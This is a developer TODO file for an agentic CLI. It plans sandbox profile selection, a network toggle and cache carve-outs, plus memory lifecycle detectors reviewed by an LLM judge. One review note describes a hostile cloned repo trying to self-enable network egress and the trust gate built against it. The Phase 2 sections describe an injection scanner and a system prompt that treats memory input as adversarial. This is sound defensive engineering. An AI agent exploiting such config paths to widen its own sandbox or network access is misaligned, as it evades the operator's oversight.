# TODO — deferred work

Items intentionally left for later milestones, with the deferral
rationale and a "pull-in" signal so we know when to revisit.

The first section ("ACTIVE") is different — it tracks work in flight
on a named branch with slices and tasks. When a slice closes, its
artifacts move to `docs/BACKLOG.md` and the entry here is trimmed.

---

# ACTIVE — `feat/sandbox-dev-toolchains`

**Branch off `develop`.** Goal: make the sandbox a usable dev environment for any language, **agnostically** — no per-language capability hardcode. Root cause: an unmodeled binary (`go`, `dotnet`, `composer`, `./user-bin`, `python script.py`) resolves to `exec('arbitrary')` with **no `write-fs`**; `selectSandboxProfile` then picks the most-restrictive `ro` (whole FS read-only) and every write fails with EROFS (`read-only file system`). `touch` works in the same dir because it's modeled (`write-fs` → `cwd-rw`) — the profile is per-command. Production-ready: planner + config + cache + diagnosis + tests + spec.

**Design decision (agnostic, validated):** capabilities stay agnostic — `exec:arbitrary` ⇒ `cwd-rw` floor + a coarse operator network posture — **never** a per-tool capability table (whack-a-mole; never covers the user's own binary; maintenance treadmill). Hardcoding a capability for an arbitrary binary is an *assumption*, not a *measurement* — against "measure twice, cut once". Fine-grained resolution stays where effects are knowable (coreutils, git). Cache LOCATIONS extend the existing finite holdout list (not capability hardcode). This is the model Codex (`sandbox_mode=workspace-write` + `network_access`) and peers converge on.

Order: Slice 0 (spec PR — must precede code) → Slice 1 (floor + cache; fixes the bug + offline dev) → Slice 2 (network posture; deps install) → Slice 3 (denial diagnosis).

## Slice 0 — Spec PR (must precede code; CLAUDE.md)

| Task | Status | Description |
|---|---|---|
| **T0.1** | ✅ | `docs/spec/PERMISSION_ENGINE.md` — §6.5 sandbox plan: documented the **`exec:arbitrary` → `cwd-rw` floor** + coarse `[sandbox] network` posture; updated the §5.2 Conservative-fallback block (`exec:shell`→`exec:arbitrary`, write-fs via floor not resolved cap, net-egress only under posture). |
| **T0.2** | ✅ | `docs/spec/SECURITY_GUIDELINE.md` §8.1 + `docs/spec/AGENTIC_CLI.md` §9.2: documented `[sandbox] network` (`off`\|`on`, default `off`) + the floor. PT-BR (spec exception). |

**Acceptance:** spec describes the floor + network posture before any code lands.

## Slice 1 — `exec:arbitrary` floor + cache gaps (fixes the bug + all offline dev)

| Task | Status | Description |
|---|---|---|
| **T1.1** | ✅ | `src/permissions/sandbox-plan.ts` — in `selectSandboxProfile`, after building `requiredKinds`: if any cap is `exec` with `scope === 'arbitrary'`, `requiredKinds.add('write-fs')` (prunes `ro` → `cwd-rw`). Add `networkAllowed?: boolean` to `SelectSandboxProfileOptions` (consumed in Slice 2). Keying on scope `arbitrary` keeps `exec:shell → ro` green (baseline of every pipeline; no over-grant to pure reads). Covers python/node/ruby/perl scripts too (`cmdInterpreter` emits `exec('arbitrary')`). |
| **T1.2** | ✅ | `src/permissions/sandbox-cache-dirs.ts` — extend `DEFAULT_WRITABLE_CACHE_DIRS`: `.nuget/packages`, `.local/share/NuGet`, `.dotnet`, `.cargo/registry`, `.gem`, `.bundle`. Existence-gated tmpfs (runner already implements). `.rustup` stays masked (rustup cargo blocked — documented). |
| **T1.3** | ✅ | Tests: `tests/permissions/sandbox-plan.test.ts` (`exec:arbitrary → cwd-rw`); conformance `tests/conformance/cases/sandbox_select.yaml` case; cache-dirs default-list test. |

**Acceptance:** `go build`/`go test` (cached deps), `dotnet build` offline, `tsc`, `gcc`/`clang`/`cmake`, `python script.py`, `./user-bin` all write to cwd + cache. Original bug closed for offline builds. `exec:shell`/reads still `ro`.

## Slice 2 — coarse `[sandbox] network` posture (deps install, agnostic)

| Task | Status | Description |
|---|---|---|
| **T2.1** | ✅ | `src/config/loaders.ts` — `SandboxConfigKeys.network?: 'off'\|'on'`; `DEFAULT_NETWORK = 'off'`; parse/validate in `parseSandboxLayer`; project-wins resolution in `loadSandboxConfig`. |
| **T2.2** | ✅ | Thread `networkAllowed` through the planner (NOT a runner global — so `decision.sandboxProfile` reflects reality): `EngineOptions.sandbox.networkAllowed` (`engine.ts`), passed at the `selectSandboxProfile` call (L2171); built in `bootstrap.ts` (`sandboxLoaded.config.network === 'on'`, beside `hostExplicitlyAllowed` ~L845). Floor extension: `hasUnboundedExec && networkAllowed` → `requiredKinds.add('net-egress')` → `cwd-rw-net`. **Finding:** subagents (`subagent-child.ts`) do NOT run the engine sandbox-plan stage (their `createPermissionEngine` passes no `sandbox` option), so the floor/posture reach the **main session only** today — parity is N/A until subagents gain the planner stage (see Deferred). |
| **T2.3** | ✅ | Tests: `exec:arbitrary + networkAllowed → cwd-rw-net`; `…+ false → cwd-rw`; loaders parse (valid/invalid/default/project-wins). |

**Acceptance:** with `[sandbox] network = "on"` in a project `.forja/config.toml`, `go mod download` / `dotnet restore` / `composer install` / `cargo build` (fetch) / `gem install` all reach the network — no per-language code. Confirm still fires (exec:arbitrary is conservative). Caveat (documented): granted egress = full inherited network (no per-host kernel filter today).

## Slice 3 — sandbox-denial diagnosis (light, non-invasive)

| Task | Status | Description |
|---|---|---|
| **T3.1** | ✅ | `src/tools/builtin/bash.ts` — when `exit_code !== 0`, `ctx.sandboxProfile` is restrictive (`ro`/`cwd-rw`), and stderr matches a denial signature (EROFS `/read-only file system/i`; network `/network is unreachable\|could not resolve host\|temporary failure in name resolution\|getaddrinfo\|name or service not known/i`), set a new optional `sandbox_hint?: string` on `BashOutput` pointing to the lever (write target outside cwd, or set `[sandbox] network = on`). No re-run, no re-confirm. |
| **T3.2** | ✅ | Tests: hint classification (EROFS, network, none when profile already has net). |

**Acceptance:** an opaque EROFS/network failure carries an actionable `sandbox_hint`. Honors "measure twice" (diagnosis, not speculative cut).

**Deferred (not this branch):** escalation-on-failure (re-run with a wider profile) — net-new on 3 fronts (runtime-denial detection, post-execution interception, re-confirm-with-mutable-profile) and inverts core invariants (confirm is pre-execution; profile is decided once, immutable; the loop never intercepts a tool failure). Would need a `docs/spec/STATE_MACHINE.md` change. Also deferred: per-host egress allowlist (proxy/nftables); per-language dep-manager capability tables (explicit non-goal); **subagent sandbox-plan** (children don't run `selectSandboxProfile` today — the floor + network posture reach the main session only; bringing subagents under the planner is a separate slice).

**Review hardening (post-implementation `/code-review`, max effort).** Six findings, all in this diff, all fixed:
- 🔴 **Trust gate:** `[sandbox] network = on` resolves project-wins → a cloned hostile repo could self-enable egress. Gated on trust of the directory that SUPPLIED the config — `isProjectConfigTrusted` = trust of `projectConfigCwd` (the repo root where `.forja/config.toml` lives), NOT the invocation cwd. (Follow-up review fix: gating on cwd let trusting only `/repo/subdir` activate a `network = "on"` from an untrusted `/repo/.forja/config.toml`, since `isTrusted` is exact-path.) Tests in `tests/cli/bootstrap.test.ts` (trusted / untrusted / subdir-trusted-but-root-not).
- 🟠 **Network never denies:** the net posture is now a POST-selection bump (`cwd-rw`→`cwd-rw-net`), not a required `net-egress` kind — so `network=on` can't turn a viable `exec:arbitrary + secret-access` plan into a refuse (stays `home-rw`). Refuse `uncovered` now reports the resolver-honest set (no floor-injected `write-fs`). `sandbox-plan.ts`.
- 🟠 **Accurate hints:** `classifySandboxDenial` messages are per-profile (no false "write in cwd" for `ro`; `$HOME` for `home-rw`); network hint suggested only for `cwd-rw` (the profile the toggle actually upgrades). `bash.ts`.
- 🟡 **No regex in the sandbox-denial path** (CLAUDE.md): regexes replaced with lower-cased `.includes()` substring markers; removed the `SANDBOX_NETWORKED_PROFILES` second-source-of-truth. `bash.ts`.

Cross-file finder found **zero** consumer/call-site regressions. Verification: typecheck + lint clean; ~4800 tests green (permissions/config/conformance/tools/cli).

**Cache completeness (gaps closed, post-review).** Extended `DEFAULT_WRITABLE_CACHE_DIRS` so every mainstream toolchain has a writable cache **regardless of the `cache_persistence` flag** (the ephemeral carve-out is the fallback when persistence is off): `.gradle`, `.m2` (JVM/Java/Kotlin), `.local/share/pnpm/store`, `.bun/install/cache` (JS — SUBDIR-scoped so the pnpm/bun binaries + PATH bins stay execable), `.pub-cache` (Dart/Flutter — shared by both), `.swiftpm` (Swift). Added a `dart` → `PUB_CACHE` entry to `CACHE_ENV_MAP` so heavy Flutter dep sets persist across spawns (not just ephemeral). **Zig** needs nothing — its cache is `~/.cache/zig` (XDG → already under the `.cache` carve-out + the `XDG_CACHE_HOME` catch-all), a clean demonstration of the agnostic design. Scoping invariant locked in tests: subdir-only whenever the blanket dir holds a binary/PATH bins (cargo/pnpm/bun); `.rustup` stays masked. Tests updated (cache-dirs + cache-env); sandbox-runner unaffected (consumes the list dynamically).

**Review fix — `.dotnet` was masking SDK installs.** `~/.dotnet` is NOT just a cache: `dotnet-install.sh` installs the SDK there and users PATH it (`$HOME/.dotnet/dotnet`), so the blanket tmpfs carve-out (from the first batch) hid the `dotnet` binary → `dotnet build` became command-not-found. The first-run sentinel lives at the `~/.dotnet/` root, so it can't be subdir-scoped. Fix: REMOVED `.dotnet` from `DEFAULT_WRITABLE_CACHE_DIRS` and added a `dotnet` → `DOTNET_CLI_HOME` redirect to `CACHE_ENV_MAP` — relocating the CLI's user-home writes (sentinel/telemetry/`dotnet tool`) off `~/.dotnet` keeps the SDK execable. NuGet PACKAGE cache (deps) stays covered by the two `.nuget*` entries (no binary). Caveat: with `cache_persistence` off the redirect is inactive, so dotnet's first-run sentinel write to a read-only `~/.dotnet` may warn (non-fatal; deps still resolve via the nuget cache).

---

# ACTIVE — `feat/memory-lifecycle-detectors`

**Branch off `feat/retrieval`.** Goal: close the four automatic detectors spec'd in `docs/spec/MEMORY.md §6.5.2` and `docs/spec/EVICTION.md §5.1` — `verify_failed`, `user_override_repeated`, `conflict_detected`, `trust_revoked` — plus the upstream infrastructure they depend on. Production-ready: substrate + detectors + operator surfaces + audit + tests + docs.

Order matters: Slice 1 (provenance) is foundational for Slices 2 and 3. Slice 6 (penalty + visual flag) is independent.

## Slice 0 — Operator escape hatch + audit baselines

Land the manual paths before the auto-detectors so the pipeline is end-to-end testable and operators have a way to drive transitions explicitly.

| Task | Status | Description |
|---|---|---|
| **T0.1** | ✅ done | `/memory quarantine <name> --motivo <kind> --evidence "…"` slash command — invokes `transitionMemoryState` with the operator's motivo. Accepts every spec motivo (`conflict`, `shift`, `security`, `low_roi`, `irrelevant`). |
| **T0.2** | ✅ done | `/memory list` rendering — `[QUARANTINED] / [INVALIDATED] / [PROPOSED] / [EXPIRED <date>]` prefix flags, `(expires <date>)` suffix for future-expiring active entries, `[ORPHAN] / [MALFORMED]` markers for unreadable rows. Spec §6.5.2 motivo+date format deferred (JOIN with eviction_events). |
| **T0.3** | ✅ done | `/memory audit --trigger <source>` filter — literal match on `details.trigger`, plus semantic shortcuts `operator` (matches `operator_driven`) and `detector` (matches the 4 spec detectors: `verify_failed`, `user_override_repeated`, `conflict_detected`, `trust_revoked`). Lays the forensic path for Slices 2-5. |
| **T0.4** | ✅ done | Tests landed inline per task (T0.1: 9, T0.2: 7, T0.3: 5 = 21 new tests). `docs/MEMORY.md` §6 table updated with the 3 new surfaces (quarantine verb, list rendering, audit --trigger); §14.5 entry added under "What IS shipped" pointing to the Slice 0 closure. |

**Acceptance:** operator runs `/memory quarantine foo --motivo conflict --evidence "duplicates bar"`, sees foo in `/memory list` with quarantine flag, inspects the row in `/memory audit`. Pipeline tested end-to-end.

## Slice 1 — Memory **exposure** infrastructure · ✅ DONE

Tracks which memory(s) **were visible to the model** at the moment of each tool call. **Not causation** — the model may ignore an exposed memory entirely. Exposure trace is foundational for the failure-correlation surfaces in Slices 2 (`verify_failed` runs against exposed memories) and 3 (`user_override_repeated` counts overrides per exposed memory).

Closed in 9 commits (`719ff0a..dab5d73` on `feat/memory-lifecycle-detectors`). Three emitters (memory_read/eager/retrieve_context), one operator surface (`/memory provenance`), 90d retention sweep, full §11.2 docs. Post-review hardening pass landed bugs/guards/idempotency. See `docs/BACKLOG.md` for the slice closure summary.

## Slice 2 — `verify_failed` detector · 🔁 ROLLED BACK (heuristic removed; substrate only)

Initial S2 shipped a regex-based path-extraction heuristic + `existsSync` verification. Rolled back per policy decision: **"todo o lifecycle de memória um llm-judge decide; sem heurísticas locais sobre texto"**. Regex over prose can't distinguish factual assertion from historical mention ("we moved away from src/old-auth.ts" → heuristic quarantines, but memory was describing history). Same fundamental class of false-positive as S4's textual conflict heuristic.

What survives in V1:
- The generic `/memory audit --trigger verify_failed` filter (from S0/T0.3) — operator-facing audit surface ready to render `verify_failed` rows when an LLM-judge emits them.
- The spec-defined trigger NAME `verify_failed` — preserved as the canonical identifier; future LLM-judge emits the same trigger.

What was deleted from the initial S2 attempt:
- `src/memory/verify/` entire directory (factuality classifier + project verifier + scheduler + types).
- `tests/memory/verify/` entire directory.
- Wire-up in `src/harness/loop.ts` (scheduler creation + poll + drain).

T2.1-T2.6 move to Phase 2 / S11 (semantic verify via LLM-judge). S11 framing updates: no longer "fallback over heuristic unknown" — LLM-judge becomes the PRIMARY path for factual contradiction detection. The hierarchy-of-mechanisms argument from spec §1.1.1 still holds in principle, but in this codebase's memory subsystem **the heuristic tier is intentionally empty** because: (a) regex over prose can't reliably distinguish assertion from mention, and (b) the deterministic part (path-existence) only matters AFTER a fragile extraction step that the heuristic gets wrong.

**Acceptance (revised):** zero text-heuristic in memory lifecycle decisions; `verify_failed` trigger name + audit filter preserved as substrate for S11 to populate via LLM-judge proposals.

## Slice 3 — `user_override_repeated` detector

**Boundary:** counter + threshold are DETERMINISTIC (event counts, sliding window math — not text judgment). When the threshold trips, fire an LLM-judge proposal via S8 (NOT auto-quarantine). Operator approves to apply. Aligns with §1.1.4 (confidence ≠ authority) and the "propose-not-mutate" policy.

| Task | Description |
|---|---|
| **T3.1** | Override signal detection — three concrete signals: (a) modal `MemoryWrite` rejected on a memory; (b) `permission ask` denied for a tool whose provenance points to this memory; (c) `edit_file` reverted within N turns of write. Each emits a `memory_override_events` row. |
| **T3.2** | Migration `055-memory-override-events.sql` — `(id, session_id FK, memory_scope, memory_name, signal ENUM, tool_call_id FK NULL, created_at)`. |
| **T3.3** | Sliding window counter — `countOverridesInWindow(scope, name, windowMs)`. Spec threshold: 3 in 24h. Deterministic counter; no text judgment. |
| **T3.4** | Threshold-triggered proposal — runs on each new override event; when threshold crosses, dispatch LLM-judge subagent with the override history + the exposed memory body. Subagent returns `{ conflicting: bool, confidence: 0.0-1.0, reasoning, suggested_motivo }`. Emit `memory_governance_proposals` (S8) with the verdict. Operator approves → state-machine transitions to quarantined with `trigger=user_override_repeated, motivo=conflict`. Below confidence threshold → proposal auto-archived. |
| **T3.5** | Tests covering each signal kind + threshold boundary (3 vs 2 hits) + proposal landing in pending state + operator approval flow. |

**Acceptance:** user rejects 3 tool-call modals in 24h whose provenance traces to memory X → governance proposal lands in pending state for operator review. Operator approves → X transitions to quarantined with full audit trail. Sub-3 hits: no proposal, no signal. The threshold (3 in 24h) is the deterministic gate that COSTS A LLM CALL; below threshold there's zero LLM cost.

## Slice 4 — `conflict_detected` audit substrate · ✅ DONE (substrate only)

Ships **only** the audit substrate. Detector deferred to Phase 2 (LLM-judge — see new Slice S13 below). Initial S4 implementation built a textual heuristic that was rolled back: <5% real-world coverage, false-positive paths on common English words, fundamentally incapable of paraphrase / semantic equivalence detection. The substrate (audit query helper + `/memory conflicts` slash) is forward-compatible with the LLM-judge path and ships now so the operator surface exists when Phase 2 lands.

What landed:

| Task | State | Description |
|---|---|---|
| **T4.4** | ✅ done | `/memory conflicts` slash command — lists eviction_events filtered by `trigger='conflict_detected'`, cross-session forensic surface. Renders `<ts> · <kind> · winner=<scope/name> loser=<scope/name> token="<shared>"`. `--limit N` default 50. |
| Helper | ✅ done | `listEvictionEventsByTrigger(db, trigger, limit)` in `eviction-events.ts` — generic. Backs `/memory conflicts` and any future trigger-filtered slash. |
| Tests | ✅ done | 4 slash tests pin empty-state hint, row rendering, `--limit` cap, unknown-flag rejection. |

What does NOT ship in S4 V1 (moved to Phase 2 / S13):

- T4.1 (pairwise comparator) — heuristic-coupled; replaced by LLM dispatcher in S13.
- T4.2 (textual contradiction heuristic) — removed entirely per "no local heuristics over text" decision.
- T4.3 (resolver) — semantics documented for S13 to implement (provenance tier > recency > scope specificity > body length → deterministic tiebreak).
- T4.5 (emit `conflict_detected`) — will land in S13 via S8 governance proposal path (propose-not-mutate; operator approves → state machine transitions).
- T4.6 (heuristic tests) — N/A; S13 will pin LLM-judge behavior with structured-output fixtures.

**Acceptance (revised):** `/memory conflicts` slash shows zero rows pre-S13 (heuristic-free), but the audit surface is ready to render LLM-judge verdicts once S13 lands.

## Slice 5 — `trust_revoked` detector

Mass-quarantines `shared/` memories when operator revokes trust after a hash change.

**Architectural rationale (boundary check against zero-heuristic commitment):** S5 fits within the architectural commitment because:
- **Detection is deterministic** — SHA-256 hash diff over canonical concat of shared/MEMORY.md + bodies. No prose judgment; the hash either matches or doesn't.
- **Judgment is operator authority** — the boot modal IS the explicit consent moment (§1.1.4: authorization vem de "operator explicit approval"). System surfaces the change; operator decides.
- **Bulk transition is justified by the modal's consent** — modal shows the diff preview; operator's revoke choice IS consent for the bulk effect across all shared memories. Per-memory governance proposals would be UX-wrong here: the operator already reviewed and decided in one place. Splitting into N proposals to approve individually would force the same decision N times.
- **Diff preview shows raw changes** — no summarization, no "looks malicious" classification. Operator reads the diff and forms their own judgment.

| Task | Description |
|---|---|
| **T5.1 ✅** | `shared/` content fingerprint — hash over canonical concat of `.forja/memory/shared/MEMORY.md` + every body file (sorted by name). Persisted in `shared_corpus_trust` (migration 055), keyed by absolute scope-root path. SHA-256 with `forja:shared-corpus:v1\n` domain separator and `filename\n<bytes-len>\n<bytes>\n` framing per file. `src/memory/trust-corpus.ts` exports `computeSharedFingerprint`, `getSharedTrust`, `setSharedTrust`, `clearSharedTrust`. 19 substrate tests. |
| **T5.2 ✅** | Boot-time re-prompt — `src/memory/trust-corpus-probe.ts` orchestrator runs the probe state machine (seeded / unchanged / reconfirmed / revoked / verify_failed). TUI flavor `shared-trust:ask` (`src/tui/events.ts`, `modal-manager.ts`, `state.ts`) renders a corpus inventory preview (file names + byte sizes, capped at 8 visible). Wired into `bootstrap.ts` BETWEEN GC sweeps AND `assembleMemorySection` so the bulk-invalidate landing on disk takes effect in this very boot's system prompt. REPL boot (`src/cli/repl.ts`) passes the modal callback + pre-subscribes stdin so the modal can receive input during bootstrap. 8 probe tests + 5 bootstrap integration tests. |
| **T5.3 ✅** | On operator revoke → emit `trust_revoked` for every `state=active` shared memory; transition all to `invalidated` with `motivo=security` (NOT `quarantined` — per EVICTION.md §4.1, `active → quarantined` admits only `conflict`/`low_roi`; `active → invalidated` is the canonical target for security events). Already-quarantined shared memories are left alone (`quarantined → invalidated` admits only `shift`). The modal interaction IS the authorization — no governance proposal layer for the bulk transition. Also added: `src/cli/memory-prompt.ts` filters `state === 'invalidated'` from the eager-load section so the revocation removes invalidated memories from THIS session's system prompt (rather than requiring restart). |
| **T5.4 ✅** | `/memory trust status` shows trust state + last hash + last re-confirm timestamp. Read-only inspector in `src/cli/slash/commands/memory.ts:handleTrust`. Renders four states: `never confirmed`, `in sync`, `DIVERGED` (upper-cased for visual weight), `VERIFY FAILED`. Hashes truncated to first 12 hex chars + ellipsis; inventory line reports file count + total bytes (counts MEMORY.md alongside body files since the fingerprint hashes both). Strict args validation refuses unknown subcommands AND extra args after `status`. 6 slash tests. |
| **T5.5 ✅** | Coverage strengthening: (a) reconfirmed path asserts ZERO eviction events emitted + memory stays active (regression guard against the bulk path accidentally running on the 'yes' branch); (b) `verify_failed` path covered via `chmod 000` on the shared root (skipped under root since unix perms are bypassed); (c) bootstrap-layer `unchanged` integration test verifies no modal fires and the trust row's timestamp is not bumped. |

**Acceptance:** operator `git pull`s a commit that adds 2 new shared memories; next session boot re-prompts; if declined, the new + existing shared memories enter `quarantined`.

## Slice 6 — Quarantine penalty ranking + visual flag (EVICTION §9.7)

Walk back the H1+H6 hard-filter (commit `949fadf`) to spec'd behavior: quarantined memories stay visible, with penalty + visual flag.

| Task | Description |
|---|---|
| **T6.1** | Retrieval memory view — include `quarantined` in candidate pool with ranking penalty (multiply final score by 0.3). Update view's `registry.list({ states: ['active', 'quarantined'] })`. |
| **T6.2** | Visual flag in eager-load — `cli/memory-prompt.ts` renders quarantined entries with `[memory: quarantined — <reason> <date>]` per spec §6.5.2. |
| **T6.3** | `/memory list` shows the same flag (already partial in T0.2; verify integration). |
| **T6.4** | Tests: quarantined memory appears in retrieval candidates but ranks below active sibling; visual flag renders in eager-load. |

**Acceptance:** quarantined memories visible to operator and model with penalty + tag. Operator decides whether to restore or delete.

## Slice 7 — Docs + E2E smoke

| Task | Description |
|---|---|
| **T7.1 ✅** | `docs/MEMORY.md §14` update — removed §14.3 "Trust boundary" (shipped via S5), renumbered §14.4 → §14.3 / §14.5 → §14.4, and rewrote the "What IS shipped" entry to break out S5 (`trust_revoked` detector full impl) + S6 (quarantine penalty + visual flag) as separate bullets; the substrate-only roster shrinks from 4 to 3 detectors (`verify_failed`, `user_override_repeated`, `conflict_detected`). Updated TODO cross-refs (lines 219, 273). |
| **T7.2 ⊘** | Skipped per operator decision (2026-05-16). No spec ambiguity surfaced during Phase 1; the only mismatch (initial draft of S5 targeted `active → quarantined` instead of `active → invalidated`) was a TODO error caught by the spec, not the other way around. |
| **T7.3 ✅** | E2E smoke — single test in `tests/cli/slash/memory.test.ts`. The original framing (contradicting memories → `conflict_detected`) is dead since the detector is Phase 2 / S13; pivoted to the operator-driven surfaces that ARE wired in Phase 1: write two project_local memories, quarantine one (assert `[QUARANTINED — motivo/trigger date]` visual flag in `/memory list` AND quarantine row in `/memory audit --trigger operator`), delete the other (state-machine route to `.tombstones/`, no entry in list), restore from tombstone (back to active, no flag). Full audit chain queried via `/memory audit --limit 50`. |
| **T7.4 ✅** | `docs/BACKLOG.md` Phase 1 closure entry summarizing shipped slices (S0/S1/S5/S6/S7 ✅, S2/S4 substrate-only) and the Phase 2 cluster handoff (S8 → S3 → S11 → S13). |

---

# Phase 2 — LLM-judge governance (proposed branch: `feat/memory-governance-llm`)

Heuristic family (Slices 0-7) covers the operations where ground truth is unambiguous (path-existence, override-counts, hash divergence). Phase 2 adds the LLM-judge layer for operations where heuristics can't reach: **semantic drift, paraphrase contradiction, consolidation candidate detection**.

Design constraints carried forward from the heuristic-vs-LLM analysis:

- **Propose-not-mutate.** LLM subagent NEVER writes/mutates memory directly. It emits structured proposals; a deterministic validator + operator approval flow drives the actual state transition.
- **Heuristic-first, LLM-fallback.** Slice 2 heuristic stays as-is; LLM only runs over the `unknown` subset where the heuristic couldn't conclude. ~30% of memories produce heuristic verdicts; the remaining ~70% are LLM's domain.
- **Injection-aware by construction.** Memory bodies are operator-edited and some are marked `trust: untrusted`. Every body that enters the subagent's window passes through `scanForInjection` first; system prompt explicitly frames input as adversarial; output is JSON-schema-validated (not free text) so prose injections can't shape the response.
- **Confidence decay.** Pending proposals expire after 30 days. A stale proposal that didn't get reviewed loses authority — automation that auto-applied based on month-old confidence would be drift, not governance.
- **Multi-source evidence.** Proposals carry not just LLM verdict but: provenance lineage, retrieval stats, outcome correlation. Never trust embedding/body content as sole evidence.

## Slice 8 — Memory governance proposal substrate · ✅ DONE

Foundational table + repo + approval flow. No LLM yet — this is the deterministic spine the subagent (Slice 11) lands its findings on. Shipped on `feat/memory-governance-llm`.

| Task | State | Description |
|---|---|---|
| **T8.1** | ✅ done | Migration `056-memory-governance-proposals.ts` (migration 055 was already taken by `shared-corpus-trust` in Phase 1 — landed at 056 instead). Tables `memory_governance_proposals` (parent) + `memory_governance_proposal_keys` (FK CASCADE auxiliary index for `listProposalsForMemory`). Schema covers all six kinds in CHECK (forward-compat for deferred kinds); UNIQUE partial index on `proposal_fingerprint WHERE status='pending'`; secondary indexes for status + session listings; `source_memory_snapshots` JSON column captures `{scope, name, content_hash}[]` at proposal creation. |
| **T8.2** | ✅ done | Repo `src/storage/repos/memory-governance.ts`. `recordProposal` validates kinds/scopes/snapshot bijection/confidence, computes fingerprint, INSERTs parent + key rows in one transaction, catches UNIQUE-constraint failures and returns the existing pending row's id with `deduped: true`. `listProposals` / `listPendingProposals` / `listProposalsForMemory` / `listPendingProposalsForMemory` (JOIN-backed) / `getProposalById` / `decideProposal` / `expirePendingProposals`. Re-exported from `src/storage/index.ts`. Helper `computeProposalFingerprint` exposed for tests + apply path. |
| **T8.3** | ✅ done | Apply path in `src/memory/governance.ts:applyProposal`. Five sequential gates: existence + status, confidence (default 0.7; NULL bypasses), kind support (quarantine + restore only in V1), single-memory only for supported kinds, staleness (drift wins over state_change). On state-machine refusal, mapped per-kind reason. `actor: 'user'`, motivo defaulted per kind (overridable via `target_payload`), trigger derived from `proposed_by` (`subagent:verify-semantic` → `verify_failed`, etc.). Same-state transitions reject with `system:state_change` (memory already in target state). |
| **T8.4** | ✅ done | TTL sweep wired in `bootstrap.ts` after `pruneMemoryProvenance`. Constant `GOVERNANCE_PROPOSAL_TTL_MS = 30d` exported. Best-effort: AUDIT DRIFT stderr on failure, never aborts boot. Cutoff exclusive (matches `pruneMemoryProvenance` semantics). |
| **T8.5+T8.5b** | ✅ done | Slash dispatcher in `src/cli/slash/commands/memory.ts:handleGovernance`. Five subcommands: `list` (with `--status` / `--limit` validation), `show` (renders full proposal detail), `approve` (modal confirm for ≥3 memories; surfaces apply-path rejection reason), `reject` (with optional `--reason`), `audit` (lineage via `listMemoryEventsByName` filter by scope + post-proposal timestamps). Strict arg validation: unknown flags refused, missing ids refused, extra positional args refused. |
| **T8.6** | ✅ done | 67 new tests: 27 in `tests/storage/memory-governance.test.ts` (repo + schema CHECK + FK CASCADE), 16 in `tests/memory/governance.test.ts` (apply-path e2e with real FS fixtures), 24 in `tests/cli/slash/memory.test.ts` (governance subcommands). Full suite: 8379 pass / 0 fail / 10 skip. |
| **T8.7** | ✅ done | `docs/MEMORY.md §11.3` documents the substrate, the six kinds, the five apply-path gates, the TTL sweep, the operator surface, and what proposals do NOT do. §11 (tables) extended from 3 to 4 tables. §14.4 "What IS shipped" lists the new slice. |

**Acceptance met:** operator runs `/memory governance list` and sees pending proposals. `approve <id>` applies via `transitionMemoryState`; row status flips to `applied`, `decided_at` + `decided_by` set, `eviction_events` row carries `proposal_id` trace field. Pending proposals expire silently after 30d via boot sweep. No memory state mutates without explicit approval — every transition driven by S8 carries an `operator:slash` (or equivalent) `decided_by` on the proposal AND an `actor='user'` on the eviction_events row.

## Slice 11 — Semantic verify_failed (LLM-judge primary path) · ✅ DONE

THE detector for factual contradiction in memory subsystem. Shipped on `feat/memory-governance-llm`. S2's heuristic was rolled back; LLM-judge is the only path. Routes factual memories (`type: project` or `reference`) through a sandboxed subagent that does semantic verification with FS tools (read_file, grep, memory_read).

**Cost-bounded:** opt-in flag (`--memory-verify-llm` or policy), per-session dispatch cap + cost cap, content-hash + recency dedup so unchanged memories don't re-trigger. The cost discipline that S2's heuristic-first layering provided is now provided by these guardrails instead.

| Task | Description |
|---|---|
| **T11.1** | Subagent definition `src/subagents/builtin/verify-semantic.md` (or `.forja/subagents/`, TBD per project convention) — system prompt frames input as adversarial, requires JSON output, enumerates allowed tools (read_file, grep, memory_read — read-only set). Output schema: `{verdict: "passed"|"contradicted"|"inconclusive", confidence: 0.0-1.0, claim_extracted: string, ground_truth_observed: string, evidence_paths: string[]}`. |
| **T11.2** | Injection pre-check — `scanForInjection(memory.body)` runs BEFORE the body enters the subagent's input. Flagged bodies skip semantic verification entirely; emit `verify_skipped` stderr line. The trust filter's intent (untrusted bodies out of model windows) extends to governance subagent windows. |
| **T11.3** | Scheduler dispatch — extend `createVerifyScheduler` so when the project heuristic returns `unknown`, the scheduler enqueues a SECONDARY task that dispatches the semantic subagent. Gated on `config.memorySemanticVerify === true` (opt-in flag in `HarnessConfig`, default false) so operators consciously enable LLM cost. **Pre-dispatch dedup guard:** before enqueueing, check `listProposalsForMemory(scope, name)` with `status='pending'` AND `kind='quarantine'`. If a pending proposal already exists for this memory, skip dispatch — avoids paying LLM cost to generate a proposal that would collide with the existing pending row anyway (T8.2's fingerprint UNIQUE index would refuse the INSERT). |
| **T11.4** | Subagent runner integration — uses existing `task_async` infrastructure: subagent spawn carries its own sandbox profile (no fs.write, no bash, no network beyond tool whitelist), depth gate, cost budget. Reuses `subagent_runs` audit table for prompt_hash + model_id + structured_output capture. |
| **T11.5** | Structured output validator — JSON schema on the subagent's return. Malformed output → discard, log `verify_semantic_malformed` stderr. The validator is the same shape as the runtime's existing `outputSchema` enforcement for `task` results. |
| **T11.6** | Emit as `memory_governance_proposals` (S8) — kind=quarantine, source_memory_keys=[{scope, name}], confidence=`output.confidence`, evidence=`{verdict, claim_extracted, ground_truth_observed, evidence_paths, subagent_run_id, prompt_hash}`. proposed_by=`subagent:verify-semantic`. |
| **T11.7** | Confidence threshold gate — proposals with `confidence < 0.7` auto-archived (status=rejected, decided_by=`system:low_confidence`). Above threshold lands as pending for operator review. Constant `SEMANTIC_VERIFY_MIN_CONFIDENCE` exported and tunable. |
| **T11.8** | Operator opt-in surface — bootstrap CLI flag `--memory-verify-llm` OR policy `[memory.verify].llm = true`. Default off. Surfaced in `/memory governance status` (new subcommand) showing whether LLM-judge is active for this session. |
| **T11.9** | Per-session cost + dispatch caps — `MEMORY_VERIFY_SEMANTIC_MAX_DISPATCHES_PER_SESSION` (default 10) + `MEMORY_VERIFY_SEMANTIC_MAX_COST_USD` (default 0.50). Scheduler refuses dispatch beyond cap; logs `memory: verify_semantic_budget_exhausted` stderr line so operator sees the throttle. Constants exported and tunable via policy. Without caps, opt-in operator can see surprise bills when memory corpus grows. |
